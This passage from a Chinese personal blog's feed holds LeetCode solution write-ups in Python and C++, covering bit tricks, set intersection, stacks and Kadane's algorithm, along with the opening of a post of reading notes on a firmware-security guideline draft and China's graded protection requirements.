l.count(&#x27;1&#x27;)</span><br></pre></td></tr></table></figure><p>还有一种暴力解法，遍历n并且记录1的个数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def hammingWeight(n: int) -&gt; int:</span><br><span class="line">    n = format(n, &quot;032b&quot;)</span><br><span class="line">    count = 0</span><br><span class="line">    for c in n:</span><br><span class="line">        if c == &quot;1&quot;:</span><br><span class="line">            count += 1</span><br><span class="line">    return count</span><br></pre></td></tr></table></figure><p>然后有一个位运算的解法，很trick，如果我自己想我肯定想不出来，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def hammingWeight(n: int) -&gt; int:</span><br><span class="line">    count = 0</span><br><span class="line">    while n != 0:</span><br><span class="line">        n = n &amp; (n - 1)</span><br><span class="line">        count += 1</span><br><span class="line">    return count</span><br></pre></td></tr></table></figure><p>位运算的相关介绍在这里：<a href="https://www.zhihu.com/question/38206659/answer/736472332">位运算有什么奇技淫巧？ - 力扣（LeetCode）的回答</a>。</p><p>也就是说，有一个方法，可以把最右边的 1 置为 0，举个具体的例子：</p><p>比如十进制的 10，二进制形式是 1010，然后我们只需要把它和 9 进行按位与操作，也就是 10 &amp; 9 = (1010) &amp; (1001) = 1000，也就是把  1010 最右边的 1 置为 0。</p><p>规律就是对于任意一个数 n，然后 n &amp; (n-1) 的结果就是把 n 的最右边的 1 置为 0 。</p><p>也比较好理解，当我们对一个数减 1 的话，比如原来的数是 …1010000，然后减一就会向前借位，直到遇到最右边的第一个 1，变成 …1001111，然后我们把它和原数按位与，就会把从原数最右边 1 开始的位置全部置零了 …10000000。</p><p>有了这个技巧，我们只需要把原数依次将最右边的 1 置为 0，直到原数变成 0，记录总共操作了几次即可。</p><p>除了以上方法之外好像还有一种比特位的方法，朋友给我说了解法但是不好放在这里，只能等我看明白之后尝试重写再放出了。</p><p>另：这道题同时也是CSAPP的一道lab题。</p>]]></content>
    
    
    <summary type="html">简单一道题</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>2248. Intersection of Multiple Arrays</title>
    <link href="http://ciaofox.me/2022/05/25/LeetCode/2248.%20Intersection%20of%20Multiple%20Arrays/"/>
    <id>http://ciaofox.me/2022/05/25/LeetCode/2248.%20Intersection%20of%20Multiple%20Arrays/</id>
    <published>2022-05-25T12:32:20.000Z</published>
    <updated>2022-05-28T12:48:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/25/XEFgYJWPiwvAnBN.png"><br><a href="https://leetcode.com/problems/intersection-of-multiple-arrays/">https://leetcode.com/problems/intersection-of-multiple-arrays/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题我第一反应是用动态解析，不断地比对交集并且进行记录。但是马上我意识到我可能把这道题想得复杂了一些。从结果来思考，结果必然同时存在于所有的数组中，那么我们只需要用第一个数组和后续数组进行交集比对，把相交结果存在一个新的数组中，用这个新数组来继续和后续数组进行交集比对，比对一轮之后剩下的就是结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def intersection(self, nums):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[List[int]]</span><br><span class="line">        :rtype: List[int]</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        result = set(nums[0])</span><br><span class="line">        for num in nums:</span><br><span class="line">            result= result &amp; set(num)</span><br><span class="line">        return sorted(list(result))</span><br></pre></td></tr></table></figure><p>同时根据Discuss中的答案上，有说使用C++的map函数来做的，我看了看map的用法，应该是通过循环遍历map，value值和arr.size()相等则意味着它在每个数组中都出现过，即是我们需要的交集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; intersection(vector&lt;vector&lt;int&gt;&gt;&amp; nums) &#123;</span><br><span class="line">        map&lt;int, int&gt; ump;</span><br><span class="line">        for(int i = 0; i &lt; nums.size(); ++i)</span><br><span class="line">            for(int j = 0; j &lt; nums[i].size(); ++j)</span><br><span class="line">                ump[nums[i][j]]++;</span><br><span class="line">        vector&lt;int&gt; res;</span><br><span class="line">        for(auto it = ump.begin(); it != ump.end(); ++it)</span><br><span class="line">            if(it-&gt;second == nums.size())</span><br><span class="line">                res.push_back(it-&gt;first);</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// In here we cannot use unordered_map, otherwise we will need to sort res</span><br></pre></td></tr></table></figure><p>另外好像存在第三种，递归的算法，我没看明白和set的区别。<br><a href="https://leetcode.cn/problems/intersection-of-multiple-arrays/solution/by-nehzil-9383/">https://leetcode.cn/problems/intersection-of-multiple-arrays/solution/by-nehzil-9383/</a></p><p>还有一个两行的算法，我看这种又短又复杂的会头晕….</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def intersection(self, nums: List[List[int]]) -&gt; List[int]:</span><br><span class="line">        return sorted(reduce(set.__iand__, map(set, nums)))</span><br></pre></td></tr></table></figure><hr><p>2022/5/28更新</p><p>我最近在看CMU 213这门课，发现原来这道题可以直接用位运算的&amp;运算符来做，但是在discuss中的<a href="https://leetcode.com/problems/intersection-of-multiple-arrays/discuss/2060765/C%2B%2B.-Fast.-Low-memory.-Bitset-based-solution.">C++. Fast. Low memory. Bitset based solution.</a>我不太看得明白，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; intersection(vector&lt;vector&lt;int&gt;&gt;&amp; nums) &#123;</span><br><span class="line">        static_assert(sizeof(unsigned long) == 8);</span><br><span class="line">        uint64_t acc[16], buf[16];</span><br><span class="line">        memset(acc, -1, sizeof(acc));</span><br><span class="line">        for (auto &amp;arr : nums) &#123;</span><br><span class="line">            memset(buf, 0, sizeof(buf));</span><br><span class="line">            for (int v : arr) &#123;</span><br><span class="line">                buf[v &gt;&gt; 6] |= 1llu &lt;&lt; (v &amp; 0x3f);</span><br><span class="line">            &#125;</span><br><span class="line">            for (int i=0; i &lt; 16; i++) acc[i] &amp;= buf[i];</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;int&gt; ans;</span><br><span class="line">        for (int i=0, v=0; i &lt; 16; i++, v=i&lt;&lt;6) &#123;</span><br><span class="line">            uint64_t b = acc[i];</span><br><span class="line">            while (b) &#123;</span><br><span class="line">                ans.push_back(v + __builtin_ctzl(b));</span><br><span class="line">                b ^= b &amp; -b;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">隔了一段时间又开始做题了。</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>少数派报告-关于固件，等保与安全（未完待续）</title>
    <link href="http://ciaofox.me/2022/05/20/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%B0%91%E6%95%B0%E6%B4%BE%E6%8A%A5%E5%91%8A-%E5%85%B3%E4%BA%8E%E5%9B%BA%E4%BB%B6%EF%BC%8C%E7%AD%89%E4%BF%9D%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    <id>http://ciaofox.me/2022/05/20/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%B0%91%E6%95%B0%E6%B4%BE%E6%8A%A5%E5%91%8A-%E5%85%B3%E4%BA%8E%E5%9B%BA%E4%BB%B6%EF%BC%8C%E7%AD%89%E4%BF%9D%E4%B8%8E%E5%AE%89%E5%85%A8/</id>
    <published>2022-05-20T09:29:57.000Z</published>
    <updated>2022-06-15T07:33:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://s2.loli.net/2022/05/20/sHPIn4b9q3ilzLJ.jpg"></p><p>很久以前在做等保的时候，我注意到三级等保中有一个控制项叫做<strong>可信验证</strong>，其对应的控制点为：</p><blockquote><p>可信验证要求：可基于可信根对计算设备的系统引导程序、系统程序、重要配置参数和通信引导程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。</p></blockquote><p>当时前辈说这一条不做测评默认不通过，因为等保2.0中有很多项是“现在做不到但是需要先立在那里”。直到最近我看到刚发布的基础架构安全弹性技术指南草案（固件安全篇），我才开始重新审视固件安全这个过去被忽视的安全点，并且出于记录写下了本篇blog。</p><p>本文是关于2022年5月17日发布的<a href="https://github.com/hardenedlinux/platform-resiliency-docs/raw/master/%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E5%BC%B9%E6%80%A7%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97%E8%8D%89%E6%A1%88%EF%BC%88%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AF%87%EF%BC%89alpha%E9%A2%84%E8%A7%88%E7%89%88.pdf">《基础架构安全弹性技术指南草案（固件安全篇）alpha 预览版》</a>的阅读笔记与延申思考。具体会思考到哪去我也不知道，毕竟我对于底层固件等内容也并没有太多了解。</p><p>注：本文引用的内容如无额外标记皆出自《基础架构安全弹性技术指南草案（固件安全篇）alpha 预览版》。</p><h2 id="什么是固件"><a href="#什么是固件" class="headerlink" title="什么是固件"></a>什么是固件</h2><p>本文档将探讨平台固件（platform firmware）安全，并且可能会可互换地简称为固件<br>（firmware）。固件（firmware）这一概念拥有多种定义，在手机/嵌入式/物联网设备的上下文中，大多时候固件指所有软件（操作系统和应用程序），手机/相机/游戏机的固件更新通常是整个基础软件的更新，这比通用计算设备上单独更新应用程序会具备更高的风险，在这些设备上的固件更新通常包括校验和以及多重引导程序能力以避免使得设备异常不可用（例如固件损毁“变砖”），在这个背景下，嵌入式领域的固件大多时候由 Linux 或者 BSD 变种构成的独立的操作系统。与之相反，本文档讨论固件的范围限于 UEFI、ACPI 、PCI OptionROM、CSME 等平台固件，值得注意的是，任何复杂到同时拥有操作系统和应用程序的移动/嵌入式/物联网设备很可能不仅仅拥有一种固件，而是拥有若干种平台固件（platform firmware）用于板载的微控制器或者处理器，例如，一台物联网网关设备可能由一个运行 Linux 系统主处理器、一个用于安全验证的处理器和若干微控制器组成。</p>]]></content>
    
    
    <summary type="html">本文是关于2022年5月17日发布的《基础架构安全弹性技术指南草案（固件安全篇）alpha 预览版》的阅读笔记与延申思考。</summary>
    
    
    
    <category term="安全运营" scheme="http://ciaofox.me/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    
    <category term="安全运营" scheme="http://ciaofox.me/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>341. Flatten Nested List Iterator</title>
    <link href="http://ciaofox.me/2022/05/08/LeetCode/341.%20Flatten%20Nested%20List%20Iterator/"/>
    <id>http://ciaofox.me/2022/05/08/LeetCode/341.%20Flatten%20Nested%20List%20Iterator/</id>
    <published>2022-05-08T13:42:21.000Z</published>
    <updated>2022-05-08T15:12:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/08/hcBvlSwPCNjf6FW.png"></p><p><a href="https://leetcode.com/problems/flatten-nested-list-iterator/">https://leetcode.com/problems/flatten-nested-list-iterator/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>看到题我的第一反应是用栈来解决，一个个进行pop就行，所以代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class NestedIterator(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, nestedList):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Initialize your data structure here.</span><br><span class="line">        :type nestedList: List[NestedInteger]</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.stack = []</span><br><span class="line">        self.list = nestedList</span><br><span class="line"></span><br><span class="line">    def next(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        return self.stack.pop()</span><br><span class="line">            </span><br><span class="line">    def hasNext(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :rtype: bool</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        while self.list or self.stack:</span><br><span class="line">            if not self.stack:</span><br><span class="line">                self.stack.append(self.list.pop(0))</span><br><span class="line">            while self.stack and not self.stack[-1].isInteger():</span><br><span class="line">                top = self.stack.pop().getList()</span><br><span class="line">                for e in top[::-1]:</span><br><span class="line">                    self.stack.append(e)</span><br><span class="line">            if self.stack and self.stack[-1].isInteger():</span><br><span class="line">                return True</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">使用栈解决了。</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>53. Maximum Subarray</title>
    <link href="http://ciaofox.me/2022/05/08/LeetCode/53.%20Maximum%20Subarray/"/>
    <id>http://ciaofox.me/2022/05/08/LeetCode/53.%20Maximum%20Subarray/</id>
    <published>2022-05-07T17:02:20.000Z</published>
    <updated>2022-05-07T19:08:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/08/U68yCdfmEQuLex1.png"></p><p><a href="https://leetcode.com/problems/maximum-subarray/">https://leetcode.com/problems/maximum-subarray/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题可以说是我这两天见过的最有趣的题了，表面上看起来非常简单，只有一脚踩进去才知道里面深千尺。最开始我完全找不到思路，于是开始看答案，第一眼看到的是这个：</p><p><img src="https://s2.loli.net/2022/05/08/X4Ga9SCNBJWrpKy.png"></p><p>看得心如死灰。</p><p>尝试了一下写遍历：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxSubArray(self, nums: List[int]) -&gt; int:</span><br><span class="line">        max=nums[0]</span><br><span class="line">        for i,num in enumerate (nums):</span><br><span class="line">            sum = num</span><br><span class="line">            if(sum&gt;max):</span><br><span class="line">                    max=sum</span><br><span class="line">            for j in range(i+1,len(nums)):</span><br><span class="line">                 sum=sum+nums[j]</span><br><span class="line">                 if(sum&gt;max):</span><br><span class="line">                    max=sum</span><br><span class="line">        return max</span><br></pre></td></tr></table></figure><p>很显然这种东西怎么可能过得了…复杂度应该是O(n^2)</p><p>然后我找到了个魔法般的Kadane’s algorithm：<a href="https://www.youtube.com/watch?v=2MmGzdiKR9Y">https://www.youtube.com/watch?v=2MmGzdiKR9Y</a></p><p>这个视频很方便又简单地让我理解了动态规划在这道题的应用，代码如下 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxSubArray(self, nums: List[int]) -&gt; int:</span><br><span class="line">        max_current = max_global = nums[0]</span><br><span class="line">        for num in nums[1:]:</span><br><span class="line">            max_current = max(num,max_current+num)</span><br><span class="line">            if(max_current&gt;max_global):</span><br><span class="line">                max_global = max_current</span><br><span class="line">        return max_global</span><br></pre></td></tr></table></figure><p>这个视频最精髓的一部分我感觉应该在这里：<br><img src="https://s2.loli.net/2022/05/08/p1zgkG3P58R2yeO.png"></p><p>以当前位置为X，过去的状态为M，比对X+M与X之间的大小。这里作者还举例了，假设存在一个更大区间并且覆盖M范围的T，T与X比对，当T+X小于M+X的时候，则必然sum[M]大于sum[T]。</p><p>而视频最后直接使用例子来描述动态规划的本质：计算每个数值时候时候让计算结果能够保存在当前位置下的状态，例如max_current = max(num,max_current+num)，然后这些状态可以被利用起来计算之后的状态。<br><img src="https://s2.loli.net/2022/05/08/DrL2hRb6CYjINuf.png"></p><p>然后最后我看到了一个神来一手：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1, len(nums)):</span><br><span class="line">    if nums[i-1] &gt; 0:</span><br><span class="line">        nums[i] += nums[i-1]</span><br><span class="line">return max(nums)</span><br></pre></td></tr></table></figure><p>作者的原话是：<br><img src="https://s2.loli.net/2022/05/08/M3HpSevbYPC9QXK.png"></p><p>本质上和Kadane’s algorithm原理是一致的，同样是不断动态获取局部的最优解。但是简洁到让人难以想象。</p>]]></content>
    
    
    <summary type="html">非常有趣的题与动态规划初探。</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>456. 132 Pattern</title>
    <link href="http://ciaofox.me/2022/05/07/LeetCode/456.%20132%20Pattern/"/>
    <id>http://ciaofox.me/2022/05/07/LeetCode/456.%20132%20Pattern/</id>
    <published>2022-05-07T15:24:10.000Z</published>
    <updated>2022-05-07T16:56:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/07/ltdioCwNmpKgqcY.png"><br><a href="https://leetcode.com/problems/132-pattern/submissions/">https://leetcode.com/problems/132-pattern/submissions/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>最开始我想速通这道题，就直接准备写三个循环把它遍历了，只要满足条件就算OK，于是我写下了如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def find132pattern(self, nums):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[int]</span><br><span class="line">        :rtype: bool</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if len(nums) &lt;=2:</span><br><span class="line">            return False</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            for j in range(len(nums)):</span><br><span class="line">                for k in range(len(nums)):</span><br><span class="line">                    if i&lt;j&lt;k and nums[i]&lt;nums[k]&lt;nums[j]:</span><br><span class="line">                        return True</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure><p>然后leetcode直接给了我一个超长数组让我算超时了….<br><img src="https://s2.loli.net/2022/05/07/WEIwhincovjX9xB.png"></p><p><img src="https://s2.loli.net/2022/05/07/SnT4X5VQAaG7cHy.png"></p><p>于是我只能发动仓鼠那贫瘠的大脑努力思考一下了：</p><p>先看复杂度，这种遍历法的时间复杂度是三次方，那尝试一下把复杂度降低一两个量级？也许可以通过固定好132模式中的1，然后来找3，再确定2的方式来解决。</p><p>行吧这个方法也不行。</p><p>那只能使用堆栈方式了（说实话我还不太能掌握堆栈），代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def find132pattern(self, nums):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[int]</span><br><span class="line">        :rtype: bool</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if len(nums) &lt;=2:</span><br><span class="line">            return False</span><br><span class="line">        third = float(&#x27;-inf&#x27;)</span><br><span class="line">        stack = []</span><br><span class="line">        for i in range(len(nums)-1, -1, -1):</span><br><span class="line">            if nums[i] &lt; third:</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                while stack and stack[-1] &lt; nums[i]:</span><br><span class="line">                    third = stack.pop()</span><br><span class="line">            stack.append(nums[i])</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">每日挑战</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>35. Search Insert Position</title>
    <link href="http://ciaofox.me/2022/05/06/LeetCode/35.%20Search%20Insert%20Position/"/>
    <id>http://ciaofox.me/2022/05/06/LeetCode/35.%20Search%20Insert%20Position/</id>
    <published>2022-05-06T15:40:10.000Z</published>
    <updated>2022-05-05T17:00:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/06/scpZj9FtSnGBwh1.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题我用的暴力检索，依次检索数组内的元素，如果指针比目标小就往后一位，如果大于等于就输出指针。这里需要考虑到如果整个数组内都比指针小的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def searchInsert(self, nums, target):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[int]</span><br><span class="line">        :type target: int</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        </span><br><span class="line">        count =0</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            if nums[i]&lt;target:</span><br><span class="line">                count+=1</span><br><span class="line">            else:</span><br><span class="line">                return count</span><br><span class="line">        return count</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">第四道题</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>66. Plus One</title>
    <link href="http://ciaofox.me/2022/05/06/LeetCode/66.%20Plus%20One/"/>
    <id>http://ciaofox.me/2022/05/06/LeetCode/66.%20Plus%20One/</id>
    <published>2022-05-06T14:06:15.000Z</published>
    <updated>2022-05-07T15:23:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/06/739HISfAu5dipco.png"><br><a href="https://leetcode.com/problems/plus-one/">https://leetcode.com/problems/plus-one/</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题很简单，但是有一些隐藏的细节可以深究。我使用的是最简单的一种方法，python可以将数组中的整数直接转换为字符串，然后合并，再转换成整数，然后+1，再变成字符串再变回数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def plusOne(self, digits):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type digits: List[int]</span><br><span class="line">        :rtype: List[int]</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        return list(str(int(&quot;&quot;.join([str(i) for i in digits]))+1))</span><br></pre></td></tr></table></figure><p>但是同时我们也可以直接检索最后一位，如果是9则变0进1，否则直接+1。这个方法更简单，但是要写判断。判断点包括如果数组内只有一个元素，以及最后一位是否为9。</p>]]></content>
    
    
    <summary type="html">第五道题</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>27. Remove Element</title>
    <link href="http://ciaofox.me/2022/05/05/LeetCode/27.%20Remove%20Element/"/>
    <id>http://ciaofox.me/2022/05/05/LeetCode/27.%20Remove%20Element/</id>
    <published>2022-05-05T15:47:11.000Z</published>
    <updated>2022-05-05T16:51:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://s2.loli.net/2022/05/06/QtwvgR9myYCdEVH.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题和26没有太大区别，一样的解法，两个指针，快指针遍历，发现val就后移，如果不是就赋值给慢指针。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def removeElement(self, nums, val):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type nums: List[int]</span><br><span class="line">        :type val: int</span><br><span class="line">        :rtype: int</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        count = 0</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            if nums[i]!=val:</span><br><span class="line">                nums[count]=nums[i]</span><br><span class="line">                count+=1</span><br><span class="line">        return count</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">第三道题</summary>
    
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://ciaofox.me/tags/LeetCode/"/>
    
